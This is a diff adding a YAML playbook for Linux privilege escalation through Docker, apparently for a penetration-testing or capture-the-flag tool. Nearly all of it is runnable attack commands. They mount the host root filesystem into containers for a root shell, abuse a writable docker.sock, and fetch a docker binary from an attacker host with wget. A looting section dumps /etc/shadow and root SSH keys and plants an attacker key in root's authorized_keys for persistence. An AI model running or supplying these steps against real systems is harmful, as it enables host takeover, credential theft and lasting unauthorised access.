@@ -1,0 +1,211 @@
+name: Linux Privilege Escalation - Docker
+
+steps:
+
+# =========================================================
+# [1] ENUMERATION
+# =========================================================
+- title: Enumerate Docker Access
+  mode: enum
+  info: |
+    Check if current user can interact with Docker.
+    Docker access is commonly equivalent to root.
+
+  entries:
+
+    - cmd: "id"
+      info: enumerate groups
+      look_for:
+        - docker
+
+    - cmd: "groups"
+      info: group membership
+
+    - cmd: "sudo -l"
+      info: check docker sudo rights
+      look_for:
+        - docker
+
+    - cmd: "which docker"
+      info: verify docker installed
+
+    - cmd: "docker ps"
+      info: enumerate running containers
+
+    - cmd: "docker image ls"
+      info: enumerate local images
+      look_for:
+        - ubuntu
+        - alpine
+        - debian
+
+    - cmd: "find / -name docker.sock 2>/dev/null"
+      info: locate docker sockets
+
+    - cmd: "ls -lah /var/run/docker.sock"
+      info: inspect socket permissions
+
+  notes:
+    - docker group is effectively root
+    - writable docker.sock is also root
+    - existing images make exploitation easier
+
+# =========================================================
+# [2] HOST MOUNT VIA DOCKER GROUP
+# =========================================================
+- title: Docker Group Host Mount
+  mode: chain
+  info: |
+    Mount host filesystem into privileged container.
+
+  entries:
+
+    - cmd: "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
+      info: mount host root and chroot into it
+
+    - cmd: "docker run --privileged -v /:/host --rm -it ubuntu bash"
+      info: privileged container with host mount
+
+    - cmd: "id"
+      info: verify root
+
+  look_for:
+    - root shell
+    - access to host filesystem
+
+  notes:
+    - this is the most common docker privesc
+    - works when user belongs to docker group
+    - alpine can replace ubuntu if needed
+
+# =========================================================
+# [3] DOCKER SOCKET ABUSE
+# =========================================================
+- title: Docker Socket Abuse
+  mode: chain
+  info: |
+    Abuse writable docker.sock to control Docker daemon.
+
+  entries:
+
+    - cmd: "find / -name docker.sock 2>/dev/null"
+      info: locate docker socket
+
+    - cmd: "ls -lah /var/run/docker.sock"
+      info: verify writable permissions
+
+    - cmd: "docker -H unix:///var/run/docker.sock ps"
+      info: interact with docker daemon
+
+    - cmd: "docker -H unix:///var/run/docker.sock image ls"
+      info: enumerate images
+
+    - cmd: "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
+      info: mount host filesystem via socket
+
+  notes:
+    - socket access is effectively root
+    - socket path may differ from default
+
+# =========================================================
+# [4] CONTAINER ESCAPE VIA SHARED MOUNTS
+# =========================================================
+- title: Shared Mount Enumeration
+  mode: enum
+  info: |
+    Enumerate mounted host directories from inside container.
+
+  entries:
+
+    - cmd: "mount"
+      info: enumerate mounted filesystems
+
+    - cmd: "cat /proc/self/mounts"
+      info: mounted volumes
+
+    - cmd: "find / -type d -name host 2>/dev/null"
+      info: search host mounts
+
+    - cmd: "find / -type d -name hostsystem 2>/dev/null"
+      info: search host mounts
+
+    - cmd: "ls -lah /hostsystem"
+      info: inspect mounted host filesystem
+
+    - cmd: "find /hostsystem/home -name id_rsa 2>/dev/null"
+      info: search SSH keys
+
+    - cmd: "cat /hostsystem/root/.ssh/id_rsa"
+      info: dump root SSH key
+
+  look_for:
+    - mounted host directories
+    - ssh keys
+    - configs
+    - credentials
+
+  notes:
+    - common in HTB containers
+    - mounted host dirs often instantly expose credentials
+
+# =========================================================
+# [5] DOCKER CLIENT INSIDE CONTAINER
+# =========================================================
+- title: Docker Binary Upload
+  mode: chain
+  info: |
+    If docker binary is missing but socket exists,
+    upload static docker client and abuse socket.
+
+  entries:
+
+    - cmd: "wget http://{attacker_ip}/docker -O /tmp/docker"
+      info: download static docker client
+
+    - cmd: "chmod +x /tmp/docker"
+      info: make executable
+
+    - cmd: "/tmp/docker -H unix:///app/docker.sock ps"
+      info: enumerate containers
+
+    - cmd: "/tmp/docker -H unix:///app/docker.sock image ls"
+      info: enumerate images
+
+    - cmd: "/tmp/docker -H unix:///app/docker.sock run --rm -it -v /:/host ubuntu chroot /host bash"
+      info: mount host filesystem
+
+  notes:
+    - useful when inside compromised container
+    - socket path commonly differs in containers
+
+# =========================================================
+# [6] POST-EXPLOITATION
+# =========================================================
+- title: Loot Host System
+  mode: enum
+  info: |
+    After mounting host filesystem, extract credentials and persistence.
+
+  entries:
+
+    - cmd: "cat /mnt/root/.ssh/id_rsa"
+      info: dump root SSH key
+
+    - cmd: "cat /mnt/etc/shadow"
+      info: dump password hashes
+
+    - cmd: "find /mnt/home -name id_rsa 2>/dev/null"
+      info: enumerate user ssh keys
+
+    - cmd: "cat /mnt/etc/passwd"
+      info: enumerate users
+
+    - cmd: "mkdir -p /mnt/root/.ssh"
+      info: create ssh directory
+
+    - cmd: "echo 'ATTACKER_PUBLIC_KEY' >> /mnt/root/.ssh/authorized_keys"
+      info: add root ssh persistence
+
+  notes:
+    - ssh keys are usually easiest persistence
+    - replace ATTACKER_PUBLIC_KEY with your real key
